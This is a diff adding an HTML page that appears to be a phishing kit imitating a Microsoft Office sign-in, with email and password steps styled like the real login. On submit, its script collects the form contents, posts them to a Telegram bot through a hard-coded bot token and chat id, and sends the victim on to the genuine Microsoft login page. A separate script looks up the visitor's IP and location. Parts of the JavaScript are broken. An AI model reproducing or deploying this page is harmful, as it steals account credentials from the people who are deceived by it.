@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  background-color: #f1f1f1;
+}
+
+#regForm {
+  background-color: #ffffff;
+  margin: 100px auto;
+  font-family: Raleway;
+  padding: 25px;
+  width: 30%;
+  /* height: 30%; */
+  min-width: 100px;
+}
+
+h1 {
+  text-align: center;  
+}
+
+input {
+  padding: 10px;
+  width: 100%;
+  font-size: 14px;
+  font-family: Raleway;
+  border: 1px solid #aaaaaa;
+}
+
+/* Mark input boxes that gets an error on validation: */
+input.invalid {
+  background-color: #ffdddd;
+}
+
+/* Hide all steps by default: */
+.tab {
+  display: none;
+}
+
+button {
+  background-color: #04AA6D;
+  color: #ffffff;
+  border: none;
+  padding: 10px 20px;
+  font-size: 14px;
+  font-family: Raleway;
+  cursor: pointer;
+}
+
+button:hover {
+  opacity: 0.8;
+}
+
+#prevBtn {
+  background-color: #bbbbbb;
+}
+
+/* Make circles that indicate the steps of the form: */
+.step {
+  height: 15px;
+  width: 15px;
+  margin: 0 2px;
+  background-color: #bbbbbb;
+  border: none;  
+  border-radius: 50%;
+  display: inline-block;
+  opacity: 0.5;
+}
+
+.step.active {
+  opacity: 1;
+}
+
+/* Mark the steps that are finished and valid: */
+.step.finish {
+  background-color: #04AA6D;
+}
+</style>
+<body>
+
+<form id="regForm" >
+  <img src="icro.png"  class="img-fluid" width="110px" height="40px"/>
+  <!-- One "tab" for each step in the form: -->
+
+  <div class="tab">
+    <h4>Sign In</h4>
+    <p> <input type="email" name="email" style=" border-top-style: hidden;
+        border-right-style: hidden;
+        border-left-style: hidden;
+        border-bottom-style: groove;
+        background-color: #fdfdfd;" placeholder="Enter Email" oninput="this.className = ''" className="form-control-sm" id="email" /></p>
+ 
+ <p className='font-weight-light' style="font-size: 14px; ">No account <a href="#" style="text-decoration: none;"> Create One!</a></p>
+ <p className='font-weight-light' style="font-size: 14px;"> <a href="#"  style="text-decoration: none;">Can't access this account?</a></p>
+ <p className='font-weight-light' style="font-size: 14px;"> <a href="#"  style="text-decoration: none;"> Sign-in options</a></p>
+  </div>
+
+
+  <div class="tab">
+    <div >
+    
+   <p style=" float: left;">
+        <a href="/office.html" style="  color: black; text-decoration: none;"> &#8592; </a>
+    </p>
+    
+      <p style="float: left; padding-left: 3%;  background-color: white;" id="demo"></p>
+    </div>
+    <p> <input type="password" name="password" style=" border-top-style: hidden;
+        border-right-style: hidden;
+        border-left-style: hidden;
+        border-bottom-style: groove;
+        background-color: #fdfdfd;" oninput="this.className = ''" placeholder="Enter Password" className="form-control-sm" id="password" /></p>
+ <p className='font-weight-light' style="font-size: 14px;"> <a href="#"  style="text-decoration: none;"> Forgot Password?</a></p>
+  </div>
+  
+  <div style="overflow:auto;">
+    <div style="float:right;">
+      <button className="btn btn-sm " type="button"  style=" color: white; background-color: #163a98; float: right;"  id="nextBtn" onclick="nextPrev(1)">Next</button>
+    </div>
+  </div>
+
+    <div style="overflow:auto;">
+    <div style="float:right;">
+      <button className="btn btn-sm " type="submit"  style=" color: white; background-color: #163a98; float: right;"  id="nextBtns" onclick="nextPrev(1)">Submit</button>
+    </div>
+  </div>
+  <!-- Circles which indicates the steps of the form: -->
+  <div>
+    <span class="steps"></span>
+    <span class="steps"></span>
+    <span class="steps"></span>
+    <span class="steps"></span>
+  </div>
+</form>
+<script>
+    $.getJSON('https://ipapi.co/json/', function(data) {
+  
+
+    document.getElementById("demo").value = (data.ip);
+    document.getElementById("demo_1").value = (data.city);
+    document.getElementById("demo_2").value = (data.country);
+    document.getElementById("demo_3").value = (data.postal);
+  
+
+});
+// let add = JSON.stringify (data, null, 2);
+
+var today = new Date();
+var dd = String(today.getDate()).padStart(2, '0');
+var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
+var yyyy = today.getFullYear();
+
+today = mm + '/' + dd + '/' + yyyy;
+document.getElementById("demo_4").value = (today);
+
+var port = location.port;
+document.getElementById("demo_5").value = (port);
+
+     
+  </script>
+<script>
+var currentTab = 0; // Current tab is set to be the first tab (0)
+showTab(currentTab); // Display the current tab
+
+function showTab(n) {
+  // This function will display the specified tab of the form...
+  var x = document.getElementsByClassName("tab");
+  var j = document.getElementById("email");
+j
+  x[n].style.display = "block";
+//   var j = document.getElementById("email");
+  
+//   j[n].style.display = "block";
+  //... and fix the Previous/Next buttons:
+  if (n == 0) {
+
+    document.getElementById("nextBtn").style.display = "inline";
+    document.getElementById("nextBtns").style.display = "none";
+ 
+  } else {
+
+    document.getElementById("nextBtns").style.display = "inline";
+    document.getElementById("nextBtn").style.display = "none";
+  }
+  if (n == (x.length - 1)) {
+    document.getElementById("nextBtns").innerHTML = "Submit";
+ 
+
+
+  } else {
+    document.getElementById("nextBtn").innerHTML = "Next";
+
+  }
+  //... and run a function that will display the correct step indicator:
+  fixStepIndicator(n)
+}
+
+function nextPrev(n) {
+
+
+ 
+        var x = document.getElementById("email").value;
+        document.getElementById("demo").innerHTML = x;
+ 
+  // This function will figure out which tab to display
+  var x = document.getElementsByClassName("tab");
+  // Exit the function if any field in the current tab is invalid:
+  if (n == 1 && !validateForm()) return false;
+  // Hide the current tab:
+  x[currentTab].style.display = "none";
+  // Increase or decrease the current tab by 1:
+  currentTab = currentTab + n;
+  // if you have reached the end of the form...
+  if (currentTab >= x.length) {
+    // ... the form gets submitted:
+    const chat_id = '1724217684', botID = 'bot5311545356:AAFU1mfTkfsxxo4_l7n0oi_W7aCsbbBUdX0';
+      const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+      document.querySelector('#regForm').addEventListener("submit", async e => { // When the user submits the form
+          e.preventDefault(); // Don't submit
+          window.location.replace("https://login.microsoftonline.com/common/login");
+          let text = JSON.stringify ( // Convert the form data to a string to send as our Telegram message
+              Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+          null, 2); // Prettify the JSON so we can read the data easily
+          const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+              method: 'POST',
+              headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+              body: JSON.stringify({chat_id, text }), // The body must be a string, not an object
+          });
+          const messageStatus = document.querySelector('#status');
+          $("#email").val("");
+          $("#password").val("");
+          
+       
+                        // Redirect the User
+                      
+                      //  $('#serverResponse').html(res);
+                  
+                },
+              ).done(function() {
+                /**
+                 * Enable all the Disabled inputs
+                 */
+    
+                email.disabled = false;
+                password.disabled = false;
+
+               
+            
+      });
+
+    return false;  
+  }
+  // Otherwise, display the correct tab:
+  showTab(currentTab);
+}
+
+function validateForm() {
+  // This function deals with validation of the form fields
+  var x, y, i, valid = true;
+  x = document.getElementsByClassName("tab");
+  y = x[currentTab].getElementsByTagName("input");
+  // A loop that checks every input field in the current tab:
+  for (i = 0; i < y.length; i++) {
+    // If a field is empty...
+    if (y[i].value == "") {
+      // add an "invalid" class to the field:
+      y[i].className += " invalid";
+      // and set the current valid status to false
+      valid = false;
+    }
+  }
+  // If the valid status is true, mark the step as finished and valid:
+  if (valid) {
+    document.getElementsByClassName("steps")[currentTab].className += " finish";
+  }
+  return valid; // return the valid status
+}
+
+function fixStepIndicator(n) {
+  // This function removes the "active" class of all steps...
+  var i, x = document.getElementsByClassName("steps");
+  for (i = 0; i < x.length; i++) {
+    x[i].className = x[i].className.replace(" active", "");
+  }
+  //... and adds the "active" class on the current step:
+  x[n].className += " active";
+}
+</script>
+
+</body>
+</html>
